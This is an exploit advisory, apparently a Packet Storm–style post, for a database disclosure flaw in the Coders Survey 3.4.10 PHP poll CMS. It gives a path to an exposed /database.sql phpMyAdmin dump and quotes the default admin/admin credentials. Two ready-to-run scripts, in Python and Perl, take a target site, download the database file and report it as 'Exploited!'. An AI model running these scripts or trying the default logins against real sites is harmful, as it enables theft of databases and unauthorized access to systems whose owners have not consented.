###########################################################################

# Exploit Title : Coders Survey 3.4.10 Database Disclosure Exploit
# Author [ Discovered By ] : KingSkrupellos
# Team : Cyberizm Digital Security Army
# Date : 02/04/2019
# Vendor Homepage : coders-survey.com
# Software Download Link : github.com/fortrabbit/coders-survey/archive/master.zip
# Software Information Link : github.com/fortrabbit/coders-survey
# Software Version : 3.4.10.1deb1 and other versions
# Tested On : Windows and Linux
# Category : WebApps
# Exploit Risk : Medium
# Vulnerability Type : 
CWE-200 [ Information Exposure ]
CWE-538 [ File and Directory Information Exposure ]
# PacketStormSecurity : packetstormsecurity.com/files/authors/13968
# CXSecurity : cxsecurity.com/author/KingSkrupellos/1/
# Exploit4Arab : exploit4arab.org/author/351/KingSkrupellos
# Acunetix Information Link about => phpMyAdmin SQL dump Web Vulnerability
acunetix.com/vulnerabilities/web/phpmyadmin-sql-dump/

###########################################################################

# Description about Software :
***************************
Coders Survey - A simple multiple choice poll CMS - Content Management System in PHP 5.4

The CMS features a creepy web based backend admin area to enter your questions and generate results. 

###########################################################################

# Impact :
***********
* The product stores sensitive information in files or directories that are accessible 

to actors outside of the intended control sphere.

* An information exposure is the intentional or unintentional disclosure of information 

to an actor that is not explicitly authorized to have access to that information.

* phpMyAdmin is a free software tool written in PHP, intended to handle the administration of 

MySQL over the World Wide Web. It can be used to dump a database or a collection of 

databases for backup or transfer to another SQL server (not necessarily a MySQL server). 

The dump typically contains SQL statements to create the table, populate it, or both. 

This file contains an phpMyAdmin SQL dump. This information is highly sensitive and 

should not be found on a production system.

Installation :
***********
Download archive / clone git
Install Slim framework via composer (cd your-project-dir; composer.phar install)
Upload to your webserver
Import the database.sql into your MySQL database
Go to http://your-host/admin
The default admin credentials are: User = admin, Password = admin
Change the default login credentials
Create pages, topics and options

Configuration :
**************
Rename the file "config.php.example" to "config.php" and replace the 
dummy values with your MySQL access credentials.

###########################################################################

File :
*****
/coders-survey/database.sql

/database.sql

Information :
************
-- phpMyAdmin SQL Dump
-- version 3.4.10.1deb1
-- phpmyadmin.net
--
-- Host: localhost
-- Server version: 5.5.24
-- PHP Version: 5.4.6-2~precise+1

-- Database: `coders_survey`

-- Table structure for table `survey_config`

-- Dumping data for table `survey_config`

-- Table structure for table `survey_item`

-- Dumping data for table `survey_item`

-- Table structure for table `survey_result`

-- Dumping data for table `survey_result`

-- Table structure for table `survey_walkthrough`

###########################################################################

# Database Disclosure Information Exposure Exploit 1 :
***********************************************
#!/usr/bin/python
import string
import re
from urllib2 import Request, urlopen
disc = "/database.sql"
url = raw_input ("URL: ")
req = Request(url+disc)
rta = urlopen(req)
print "Result"
html = rta.read()
rdo = str(re.findall("resources.*=*", html))
print rdo
exit

###########################################################################

# Database Disclosure Information Exposure Exploit 2 :
***********************************************
#!/usr/bin/perl -w
# Author : KingSkrupellos
# Team : Cyberizm Digital Security Army

use LWP::Simple;
use LWP::UserAgent;

system('cls');
system('Coders Survey 3.4.10.1deb1 Database Disclosure Exploit');
system('color a');


if(@ARGV < 2)
{
print "[-]How To Use\n\n";
&help; exit();
}
sub help()
{
print "[+] usage1 : perl $0 site.com /path/ \n";
print "[+] usage2 : perl $0 localhost / \n";
}
($TargetIP, $path, $File,) = @ARGV;

$File="database.sql";
my $url = "http://" . $TargetIP . $path . $File;
print "\n Wait Please Dear Hacker!!! \n\n";

my $useragent = LWP::UserAgent->new();
my $request = $useragent->get($url,":content_file" => "D:/database.sql");

if ($request->is_success)
{
print "[+] $url Exploited!\n\n";
print "[+] Database saved to D:/database.sql\n";
exit();
}
else
{
print "[!] Exploiting $url Failed !\n[!] ".$request->status_line."\n";
exit();
}

###########################################################################

# Discovered By KingSkrupellos from Cyberizm.Org Digital Security Team 

###########################################################################
